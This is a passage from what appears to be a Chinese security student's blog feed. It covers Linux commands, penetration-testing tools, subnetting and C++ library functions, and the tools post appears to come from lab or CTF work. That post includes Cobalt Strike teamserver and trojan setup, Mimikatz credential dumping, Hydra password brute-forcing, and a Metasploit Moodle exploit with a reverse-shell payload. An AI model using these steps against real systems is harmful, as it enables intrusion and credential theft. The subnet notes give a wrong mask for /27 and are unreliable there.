wget</h1>\n<p>下载文件</p>\n<h1 id=\"mkdir\"><a class=\"anchor\" href=\"#mkdir\">#</a> mkdir</h1>\n<p><code>mkdir -p</code>  确保目录名称存在</p>\n<h1 id=\"ls-a\"><a class=\"anchor\" href=\"#ls-a\">#</a> ls -a</h1>\n<p>显示当前目录中的所有文件和目录，包括<strong>隐藏</strong>文件</p>\n<p><code>cat .flag.txt</code>  打开隐藏的 txt</p>\n",
            "tags": [
                "Web",
                "Linux"
            ]
        },
        {
            "id": "http://yoursite.com/Web/%E5%B7%A5%E5%85%B7/",
            "url": "http://yoursite.com/Web/%E5%B7%A5%E5%85%B7/",
            "title": "Web常用工具",
            "date_published": "2024-03-17T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"fscan\"><a class=\"anchor\" href=\"#fscan\">#</a> fscan</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZpdmVyeWEvYXJ0aWNsZS9kZXRhaWxzLzEyNzkwMzU2OQ==\">https://blog.csdn.net/Fiverya/article/details/127903569</span></p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>git clone https<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>github<span class=\"token punctuation\">.</span>com<span class=\"token operator\">/</span>shadow1ng<span class=\"token operator\">/</span>fscan<span class=\"token punctuation\">.</span>git</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>wget https<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>dl<span class=\"token punctuation\">.</span>google<span class=\"token punctuation\">.</span>com<span class=\"token operator\">/</span><span class=\"token keyword\">go</span><span class=\"token operator\">/</span>go1<span class=\"token punctuation\">.</span><span class=\"token number\">17.8</span><span class=\"token punctuation\">.</span>linux<span class=\"token operator\">-</span>amd64<span class=\"token punctuation\">.</span>tar<span class=\"token punctuation\">.</span>gz</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>tar <span class=\"token operator\">-</span>C <span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>local<span class=\"token operator\">/</span> <span class=\"token operator\">-</span>xzf go1<span class=\"token punctuation\">.</span><span class=\"token number\">17.8</span><span class=\"token punctuation\">.</span>linux<span class=\"token operator\">-</span>amd64<span class=\"token punctuation\">.</span>tar<span class=\"token punctuation\">.</span>gz</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Go环境变量</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>vim ~<span class=\"token operator\">/</span><span class=\"token punctuation\">.</span>profile</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>┌──<span class=\"token punctuation\">(</span>root💀kali<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token punctuation\">[</span>~<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>└─# cat ~<span class=\"token operator\">/</span><span class=\"token punctuation\">.</span>profile         </pre></td></tr><tr><td data-num=\"10\"></td><td><pre># ~<span class=\"token operator\">/</span><span class=\"token punctuation\">.</span>profile<span class=\"token punctuation\">:</span> executed by Bourne<span class=\"token operator\">-</span>compatible login shells<span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">[</span> <span class=\"token string\">\"$BASH\"</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> then</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">[</span> <span class=\"token operator\">-</span>f ~<span class=\"token operator\">/</span><span class=\"token punctuation\">.</span>bashrc <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> then</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">.</span> ~<span class=\"token operator\">/</span><span class=\"token punctuation\">.</span>bashrc</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  fi</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>fi</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>mesg n <span class=\"token operator\">||</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>export PATH<span class=\"token operator\">=</span>$PATH<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>local<span class=\"token operator\">/</span><span class=\"token keyword\">go</span><span class=\"token operator\">/</span>bin</pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>source ~<span class=\"token operator\">/</span><span class=\"token punctuation\">.</span>profile</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">go</span> env 查看环境变量</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">go</span> env <span class=\"token operator\">-</span>w GO111MODULE<span class=\"token operator\">=</span>on</pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">go</span> env <span class=\"token operator\">-</span>w GOPROXY<span class=\"token operator\">=</span>https<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>goproxy<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">,</span>direct</pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">go</span> mod tidy</pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">go</span> build <span class=\"token operator\">-</span>ldflags<span class=\"token operator\">=</span><span class=\"token string\">\"-s -w \"</span> <span class=\"token operator\">-</span>trimpath main<span class=\"token punctuation\">.</span><span class=\"token keyword\">go</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>main <span class=\"token operator\">-</span>h <span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.128</span></pre></td></tr></table></figure><h1 id=\"cobalt-strike\"><a class=\"anchor\" href=\"#cobalt-strike\">#</a> Cobalt Strike</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzYwNTcxODQyL2FydGljbGUvZGV0YWlscy8xMzI5MjA2NzI=\">CobaltStrike4.8 汉化版带插件_cobaltstrike 下载 - CSDN 博客</span></p>\n<p>[【渗透测试笔记】之【内网渗透 —— 横向移动：PsExec 的使用】_横向渗透 psexec-CSDN 博客](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0ODc0NjQ1L2FydGljbGUvZGV0YWlscy8xMjEzOTQ2NzgjOn46dGV4dD1DUyVFNCVCOCVBRCVFNyU5QSU4NFBzRXhlYw==\">https://blog.csdn.net/qq_44874645/article/details/121394678#:~:text=CS 中的 PsExec</span> 2.1 查看目标所在网段其它主机 扫描主机 列出主机，2.2 使用 PsExec 横向移动 右键要横向的目标主机，选择 psexec 的版本（32 位 64 位或 PowerShell）。 选择已经获得的凭据（明文、散列值、令牌都可以）、回连的 listener、进行横向的 session。 点击 Launch，即会返回一个 DC-1 的 session。)</p>\n<p>xftp 上传 server 文件夹（需要 ssh 服务）</p>\n<p>KALI 服务端部署</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mkdir</span>  cs //当前目录建一个cs目录 存放cs文件</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">cd</span> cs</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">chmod</span> a+x ./teamserver  给权限</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">ifconfig</span> //查看本机IP地址 要与客户机ping得通  才可以连接</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>./teamserver <span class=\"token number\">192.168</span>.57.128 <span class=\"token number\">123456</span>  //本机ip+密码-密码随便设置</pre></td></tr></table></figure><p>Windows 客户端部署</p>\n<p>双击 client 文件夹下的 Cobalt_Strike_CN.vbs，连接时用 kali 的 ip 地址，监听器设置的也是 kali，生成木马运行后会自动获取受害机 ip</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sleep</span> <span class=\"token number\">3</span> 全部命令3秒执行<span class=\"token punctuation\">(</span>默认时60秒太长，<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>执行系统命令要在命令前加个  shell <span class=\"token function\">whoami</span></pre></td></tr></table></figure><h2 id=\"mimikatz\"><a class=\"anchor\" href=\"#mimikatz\">#</a> Mimikatz</h2>\n<p>提取 windows 凭据的密码</p>\n<p>管理员身份执行： <code>logonpasswords</code></p>\n<h2 id=\"psexec\"><a class=\"anchor\" href=\"#psexec\">#</a> PSexec</h2>\n<h1 id=\"rips\"><a class=\"anchor\" href=\"#rips\">#</a> RIPS</h1>\n<p>PHP 代码审计</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MjUxNTU4OC9hcnRpY2xlL2RldGFpbHMvMTIzOTY1NzQ0\">https://blog.csdn.net/weixin_52515588/article/details/123965744</span></p>\n<h1 id=\"fortify\"><a class=\"anchor\" href=\"#fortify\">#</a> Fortify</h1>\n<p>代码审计软件</p>\n<ol>\n<li>把 <code>fortify.license</code>  和 <code>Fortify_SCA_23.1.0_windows_x64.exe</code> 、 <code>Fortify_Apps_and_Tools_23.1.0_windows_x64.exe</code> <br />\n 剪贴放在同一目录，不要有中文。</li>\n<li>安装 <code>Fortify_SCA_23.1.0_windows_x64.exe</code>  和 <code>Fortify_Apps_and_Tools_23.1.0_windows_x64.exe</code> ，程序会自动找到 <code>fortify.license</code>  授权文件</li>\n<li>把 <code>fortify-common-23.1.0.0028.jar</code>  分别拷贝到 <code>Fortify\\Fortify_SCA_23.1.0\\Core\\lib\\</code> <br />\n 和 <code>Fortify\\Fortify_Apps_and_Tools_23.1.0\\Core\\lib\\</code>  替换覆盖</li>\n<li>解压 <code>FortifyRules_zh_CH_2023.1.1.0001(离线规则库).zip</code>  规则库，把 <code>ExternalMetadata</code>  和 <code>rules</code>  文件夹拷贝到 <code>Fortify\\Fortify_SCA_23.1.0\\Core\\config</code>  下</li>\n<li>运行 <code>Fortify\\Fortify_Apps_and_Tools_23.1.0\\bin</code>  下的 <code>auditworkbench.cmd</code>  即可开启 GUI 界面</li>\n<li>根据需要配置扫描即可</li>\n<li>规则库：直接本地无法升级规则库，离线升级及最新中英文规则库。</li>\n</ol>\n<h1 id=\"nmap\"><a class=\"anchor\" href=\"#nmap\">#</a> Nmap</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>扫整个网段ip存活情况nmap <span class=\"token operator\">-</span>sP <span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.0</span><span class=\"token operator\">/</span><span class=\"token number\">24</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>扫描开放端口的服务版本nmap <span class=\"token operator\">-</span>sV <span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.0</span><span class=\"token operator\">/</span><span class=\"token number\">24</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>单独扫描域名nmap <span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.135</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>全端口扫描nmap <span class=\"token operator\">-</span>sV <span class=\"token operator\">-</span>p<span class=\"token operator\">-</span> <span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.135</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>扫描端口服务的详细信息nmap <span class=\"token operator\">-</span>sS <span class=\"token operator\">-</span>sV <span class=\"token operator\">-</span>A <span class=\"token operator\">-</span>T5 <span class=\"token operator\">-</span>p55006<span class=\"token punctuation\">,</span><span class=\"token number\">55007</span> <span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.135</span></pre></td></tr></table></figure><h1 id=\"hydra\"><a class=\"anchor\" href=\"#hydra\">#</a> Hydra</h1>\n<p>九头蛇暴力破解</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>echo命令两个用户名写入txt文件</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>gedit name<span class=\"token punctuation\">.</span>txt</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>echo <span class=\"token operator\">-</span>e <span class=\"token string\">'natalya\\nboris'</span> <span class=\"token operator\">></span> name<span class=\"token punctuation\">.</span>txt</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Hydra自带的字典进行密码爆破</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Hydra <span class=\"token operator\">-</span>L name<span class=\"token punctuation\">.</span>txt <span class=\"token operator\">-</span>P <span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>share<span class=\"token operator\">/</span>wordlists<span class=\"token operator\">/</span>fasttrack<span class=\"token punctuation\">.</span>txt <span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.135</span> <span class=\"token operator\">-</span>s <span class=\"token number\">55007</span> pop3</pre></td></tr></table></figure><h1 id=\"metasploit\"><a class=\"anchor\" href=\"#metasploit\">#</a> Metasploit</h1>\n<pre><code class=\"language-Python\">msfconsole                        ---进入MSF框架攻击界面\nsearch moodle                     ---查找 moodle这个CMS的攻击的模块\nuse 1(攻击脚本编号)                ---调用0  exploit/multi/http/moodle_cmd_exec调用攻击脚本\nshow options                      ---查看需要填充的变量\nset username admin                ---设置用户名：admin\nset password xWinter1995x!        ---设置密码：xWinter1995x!\nset rhost severnaya-station.com   ---设置：rhosts severnaya-station.com\nset targeturi /gnocertdir         ---设置目录： /gnocertdir\nset payload cmd/unix/reverse      ---设置payload：cmd/unix/reverse（linux内核，Linux是一个                                      类 Unix 操作系统）\nset lhost 192.168.200.131         ---设置：lhost 192.168.200.131（需要本地IP）\nexploit  ----执行命令\n</code></pre>\n<h1 id=\"cewl\"><a class=\"anchor\" href=\"#cewl\">#</a> cewl</h1>\n<p>通过爬行网站获取关键信息创建一个密码字典</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>cewl http<span class=\"token punctuation\">:</span><span class=\"token operator\">//</span><span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.136</span><span class=\"token punctuation\">:</span><span class=\"token number\">1898</span><span class=\"token operator\">/</span>?q<span class=\"token operator\">=</span>node<span class=\"token operator\">/</span><span class=\"token number\">1</span> <span class=\"token operator\">-</span>w xxg<span class=\"token punctuation\">.</span>txt</pre></td></tr></table></figure>",
            "tags": [
                "Web",
                "CTF_Web"
            ]
        },
        {
            "id": "http://yoursite.com/Web/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/",
            "url": "http://yoursite.com/Web/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/",
            "title": "计算机网络基础",
            "date_published": "2024-03-17T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"子网掩码\"><a class=\"anchor\" href=\"#子网掩码\">#</a> 子网掩码</h1>\n<p>二进制换算成十六进制</p>\n<p><code>11111111.11111111.11111111.00000000(网络号)(主机号)</code></p>\n<p>C 网默认的子网掩码是： <code>255.255.255.0</code></p>\n<p><code>192.168.1.53/27</code>  对应的子网掩码是 <code>255.255.255.254</code></p>\n<p><code>11111111.11111111.11111111.11100000(网络号)(主机号)</code></p>\n<p>网络号向主机号借了 3 位（27-24）, 子网有 8 个，最大容纳主机数 32 个 (0 的个数)</p>\n<h1 id=\"cmd\"><a class=\"anchor\" href=\"#cmd\">#</a> cmd</h1>\n<p><code>ncpa.cpl</code>   打开网络适配器设置</p>\n",
            "tags": [
                "Web",
                "CTF_Web"
            ]
        },
        {
            "id": "http://yoursite.com/Web/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/",
            "url": "http://yoursite.com/Web/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/",
            "title": "沙箱逃逸漏洞总结",
            "date_published": "2024-03-17T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"nodejs\"><a class=\"anchor\" href=\"#nodejs\">#</a> NodeJS</h1>\n<p><code>JavaScript -&gt; 浏览器，前端</code></p>\n<p><code>NodeJS -&gt; 用Chrome中的v8引擎为Javascript开发的运行环境，后端</code></p>\n<ul>\n<li><code>沙箱sandbox</code> ：运行一些可能会产生危害的程序，我们不能直接在主机的真实环境上进行测试，所以可以通过单独开辟一个运行代码的环境，它与主机相互隔离，但使用主机的硬件资源，我们将有危害的代码在沙箱中运行只会对沙箱内部产生一些影响，而不会影响到主机上的功能，沙箱的工作机制主要是依靠重定向，将恶意代码的执行目标重定向到沙箱内部。</li>\n<li><code>虚拟机VM</code> ：实现一台电脑上使用多个操作系统</li>\n<li><code>容器Docker</code> ：sandbox 的一种，通过创造一个有边界的运行环境将程序放在里面，使程序被边界困住，从而使程序与程序，程序与主机之间相互隔离开。在实际防护时，使用 Docker 和 sandbox 嵌套的方式更多一点，安全性也更高。</li>\n</ul>\n<h2 id=\"vm逃逸\"><a class=\"anchor\" href=\"#vm逃逸\">#</a> VM 逃逸</h2>\n<p>Nodejs 中，我们可以通过引入 <code>vm</code>  模块来创建一个 “沙箱”</p>\n<h2 id=\"vm2逃逸\"><a class=\"anchor\" href=\"#vm2逃逸\">#</a> VM2 逃逸</h2>\n",
            "tags": [
                "Web",
                "CTF_Web"
            ]
        },
        {
            "id": "http://yoursite.com/Algorithm/c++%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/",
            "url": "http://yoursite.com/Algorithm/c++%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/",
            "title": "c++常用函数",
            "date_published": "2024-03-16T15:29:08.000Z",
            "content_html": "<h2 id=\"max\"><a class=\"anchor\" href=\"#max\">#</a> max( )</h2>\n<pre><code class=\"language-c++\">头文件#include &lt;algorithm&gt;\nusing namespace std;\nmax（ ， ）\n</code></pre>\n<h2 id=\"strlen\"><a class=\"anchor\" href=\"#strlen\">#</a> strlen( )</h2>\n<p>头文件：&lt;cstring&gt;<br />\n 格式：strlen（字符数组名）<br />\n功能：仅计算<strong>字符串 s</strong> 的（unsigned int 型）长度，不包括’\\0’在内，<strong>char [i] == ‘\\0’是字符串结束的标志</strong><br />\n说明：返回 s 的长度，不包括结束符 NULL</p>\n<pre><code class=\"language-c++\">实例\n#include &lt;iostream&gt;\n#include &lt;cstring&gt;\nint main(void)\n&#123;\n    char s[] = &quot;Golden Global View&quot;;\n    std:: cout &lt;&lt; s &lt;&lt; &quot; has &quot; &lt;&lt; strlen(s) &lt;&lt; &quot; chars&quot;;\n    return 0;\n&#125;\n// Golden Global View has 18 chars\n</code></pre>\n<pre><code class=\"language-c++\">使用strlen时一定要注意是否赋值\nchar aa[10];cout&lt;&lt;strlen(aa)&lt;&lt;endl; //结果是不定的\nchar aa[10]=&#123;'\\0'&#125;; cout&lt;&lt;strlen(aa)&lt;&lt;endl; //结果为0\nchar aa[10]=&quot;jun&quot;; cout&lt;&lt;strlen(aa)&lt;&lt;endl; //结果为3\n</code></pre>\n<h2 id=\"malloc\"><a class=\"anchor\" href=\"#malloc\">#</a> malloc( )</h2>\n<p>头文件 #include&lt;malloc.h&gt;</p>\n<p>malloc 内的参数是需要 &lt;font color='red'&gt; 动态分配的字节数 &lt;/font&gt;</p>\n<p>malloc 函数返回的是 void * 类型，必须通过 (type *) 来强制转换</p>\n<p>malloc（）是动态内存分配函数，用来向系统请求分配内存空间。当无法知道内存具体的位置时，想要绑定真正的内存空间，就要用到 malloc（）函数。因为 malloc 只管分配内存空间，并不能对分配的空间进行初始化，所以申请到的内存中的值是随机的，经常会使用 memset () 进行置 0 操作后再使用。</p>\n<p>与其配套的是 free（），当申请到的空间不再使用时，要用 free（）函数将内存空间释放掉，这样可以提高资源利用率，最重要的是 ---- 就是因为它可以申请内存空间，然后根据需要进行释放，才被称为 “动态内存分配”!</p>\n<pre><code class=\"language-c++\">type *var_name = (type*)malloc(sizeof(type)*num);\n</code></pre>\n<pre><code class=\"language-c++\">int *p;\np = (int*)malloc(sizeof(int) * 128);\n//分配128个整型存储单元，并将这128个连续的整型存储单元的首地址存储到指针变量p中\ndouble *pd = (double*)malloc(sizeof(double) * 12);　　\n//分配12个double型存储单元，并将首地址存储到指针变量pd中\nfree(p);\nfree(pd);\np = NULL;\npd = NULL;　　\n指针用完赋值NULL是一个很好的习惯。\n内存泄漏一般是指程序申请了一块内存，使用完后，没有及时将这块内存释放，从而导致程序占用大量内存。\n</code></pre>\n<h2 id=\"memset\"><a class=\"anchor\" href=\"#memset\">#</a> memset( )</h2>\n<p>头文件 #include&lt;cstring&gt;</p>\n<p>memset 函数是内存赋值函数，用来给某一块内存空间进行赋值的。 其原型是：void* memset (void *_Dst, int _Val, size_t <em>Size)</em>——————sizeof (数组名)</p>\n<p>Dst 是目标起始地址，_Val 是要赋的值，_Size 是要赋值的字节数。</p>\n<p>memset 是逐字节拷贝的，给 char 以外的数组赋值时，只能初始化为 0 或者 - 1</p>\n<ul>\n<li>1、可以使用 memset 函数对 char 类型数组的元素进行赋值（0 值或非 0 值）。</li>\n<li>2、可以使用 memset 函数对非 char 类型数组的元素进行赋 0 值或 - 1，但不能使用 memset 函数直接对非 char 类型数组的元素赋非 0 值。这里的非 char 类型数组，是指数据类型大小不是 1 个字节的，比如 short、int、long、占用字节数大于 1 个字节的结构体等。</li>\n</ul>\n<pre><code class=\"language-c++\">memset(a,0,sizeof(a));\n</code></pre>\n<h2 id=\"常用sort\"><a class=\"anchor\" href=\"#常用sort\">#</a> 常用 sort ( )</h2>\n<p><strong>头文件：</strong></p>\n<pre><code class=\"language-c++\">#include &lt;algorithm&gt;\nusing namespace std;\n</code></pre>\n<p><strong>基本使用办法</strong></p>\n<p>sort () 函数可以对给定区间所有元素进行排序。它有三个参数 &lt; font color='red'&gt;sort (begin, end, cmp)&lt;/font&gt;，其中 begin 为指向待 sort () 的数组的 &lt; font color='red'&gt; 第一个元素的指针 &lt;/font&gt;，end 为指向待 sort () 的数组的 &lt; font color='red'&gt; 最后一个元素的下一个位置的指针 &lt;/font&gt;，cmp 参数为排序准则，cmp 参数 &lt; font color='red'&gt; 可以不写（即为 sort（begin, end））&lt;/font&gt;，<strong>默认从小到大进行排序</strong>。如果我们想从大到小排序可以将 cmp 参数写为 greater&lt;int&gt;() 就是对 int 数组进行排序，当然 &lt;&gt; 中我们也可以写 double、long、float 等等。</p>\n<p>如果我们需要按照其他的排序准则，那么就需要我们自己定义一个 bool 类型的函数来传入:</p>\n<p>升序：第一个参数小于第二个该函数，返回 true。<br />\n降序：第一个参数大于第二个该函数，返回 true。</p>\n<p><strong>对一个整型数组进行从大到小排序：</strong></p>\n<pre><code class=\"language-c++\">#include&lt;iostream&gt;\n#include&lt;algorithm&gt;\nusing namespace std;\n\nint main()&#123;\n\tint num[10] = &#123;6,5,9,1,2,8,7,3,4,0&#125;;\n\tsort(num,num+10,greater&lt;int&gt;());\n\tfor(int i=0;i&lt;10;i++)&#123;\n\t\tcout&lt;&lt;num[i]&lt;&lt;&quot; &quot;;\n\t&#125;//输出结果:9 8 7 6 5 4 3 2 1 0\n\t\n\treturn 0;\n\t\n&#125; \n</code></pre>\n<p><strong>自定义排序准则</strong></p>\n<pre><code class=\"language-c++\">//按照每个数的个位进行从大到小排序\n#include&lt;iostream&gt;\n#include&lt;algorithm&gt;\nusing namespace std;\n\nbool cmp(int x,int y)&#123;\n\treturn x % 10 &gt; y % 10;\n&#125;\n\nint main()&#123;\n\tint num[10] = &#123;65,59,96,13,21,80,72,33,44,99&#125;;\n\tsort(num,num+10,cmp);\n\tfor(int i=0;i&lt;10;i++)&#123;\n\t\tcout&lt;&lt;num[i]&lt;&lt;&quot; &quot;;\n\t&#125;//输出结果：59 99 96 65 44 13 33 72 21 80\n\t\n\treturn 0;\n\t\n&#125; \n</code></pre>\n<p><strong>对结构体进行排序</strong></p>\n<pre><code class=\"language-c++\">#include&lt;iostream&gt;\n#include&lt;string&gt;\n#include&lt;algorithm&gt;\nusing namespace std;\n\nstruct Student&#123;\n\tstring name;\n\tint score;\n\tStudent() &#123;&#125;\n\tStudent(string n,int s):name(n),score(s) &#123;&#125;\n&#125;;\n\nbool cmp_score(Student x,Student y)&#123;\n\treturn x.score &gt; y.score;\n&#125;\n\nint main()&#123;\n\tStudent stu[3];\n\tstring n;\n\tint s;\n\tfor(int i=0;i&lt;3;i++)&#123;\n\t\tcin&gt;&gt;n&gt;&gt;s;\n\t\tstu[i] = Student(n,s);\n\t&#125;\n\t\n\tsort(stu,stu+3,cmp_score);\n\t\n\tfor(int i=0;i&lt;3;i++)&#123;\n\t\tcout&lt;&lt;stu[i].name&lt;&lt;&quot; &quot;&lt;&lt;stu[i].score&lt;&lt;endl;\n\t&#125;\n\t\n\treturn 0;\n&#125;\n</code></pre>\n<h2 id=\"qsort\"><a class=\"anchor\" href=\"#qsort\">#</a> qsort( )</h2>\n<p>头文件 #include&lt;cstdlib&gt;</p>\n<p>“比较函数” 的原型应是：int 函数名 (const void * elem1, const void * elem2)</p>\n<p>/* 参数列表是两个空指针，现在他要去指向你的数组元素。所以转型为你当前的类型，然后取值。</p>\n<p>升序排列时：</p>\n<p>若第一个参数指针指向的 “值”<strong> 大于</strong>第二个参数指针指向的 “值”，则返回正；<br />\n若第一个参数指针指向的 “值”<strong> 等于</strong>第二个参数指针指向的 “值”，则返回零；<br />\n若第一个参数指针指向的 “值”<strong> 小于</strong>第二个参数指针指向的 “值”，则返回负。</p>\n<p>降序排列时，则刚好相反。</p>\n<p>*/</p>\n<pre><code class=\"language-c++\">用法示例：\n#include&lt;cstdlib&gt;\nint cmpfunc (const void * a, const void * b) &#123;\n   return *(int *)a - *(int *)b;//升序排序\n   return *(int *)b - *(int *)a; //降序排序\n&#125;\nqsort(nums, numsSize, sizeof(int), cmpfunc);//写在需要进行排序操作的函数里\n</code></pre>\n<h2 id=\"位运算\"><a class=\"anchor\" href=\"#位运算\">#</a> 位运算</h2>\n<p>标准运算符，不用头文件</p>\n<p>转换为二进制后，对每一位进行运算，生成新的数</p>\n<p>&amp; 与</p>\n<pre><code class=\"language-c++\">2的幂：若 n = 2^x，恒有 (n &gt; 0) &amp;&amp; (n &amp; (n - 1)) == 0\n4的幂：若 n = 4^x，恒有 (n &gt; 0) &amp;&amp; (n &amp; (n - 1)) == 0 &amp;&amp; (n &amp; 0xAAAAAAAA) ==0\n- n二进制最高位为 1，其余所有位为 0；\n- n - 1二进制最高位为 0，其余所有位为 1；\n</code></pre>\n<dl>\n<dt>| 或</dt>\n<dd>非</dd>\n</dl>\n<p>^ 异或</p>\n<p>&gt;&gt; 右移，相当于除 2</p>\n<p>&lt;&lt; 左移，相当于乘 2</p>\n<h2 id=\"calloc\"><a class=\"anchor\" href=\"#calloc\">#</a> calloc</h2>\n<p>头文件 #include&lt;cstdlib&gt;</p>\n<p>分配所需的内存空间，并返回一个指向它的指针。<strong>malloc</strong> 和 <strong>calloc</strong> 之间的不同点是，malloc 不会设置内存为零，而 calloc 会设置分配的内存为零。</p>\n<p>不需要 memset 置 0，calloc = malloc+memset ，但是推荐 calloc</p>\n<pre><code class=\"language-c++\"> void *calloc(size_t nitems, size_t size)\n nitems -- 要被分配的元素个数。\n size -- 元素的大小。\n a = (int*)calloc(n, sizeof(int));\n例：int *arr = (int *) calloc(10, sizeof(int))\n</code></pre>\n<h2 id=\"null-和-nullptr\"><a class=\"anchor\" href=\"#null-和-nullptr\">#</a> NULL 和 nullptr</h2>\n<p>C<ins>11 版本中新加入 nullptr，解决 NULL 表示空指针在 C</ins> 中具有二义性</p>\n<p>如：ListNode* l1 = nullptr</p>\n<p>c 和 c++ 对比阐述</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>c语言中<span class=\"token constant\">NULL</span>为空指针</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">NULL</span> <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span>  <span class=\"token operator\">*</span>pi <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>pc <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>C语言中把空指针赋给<span class=\"token 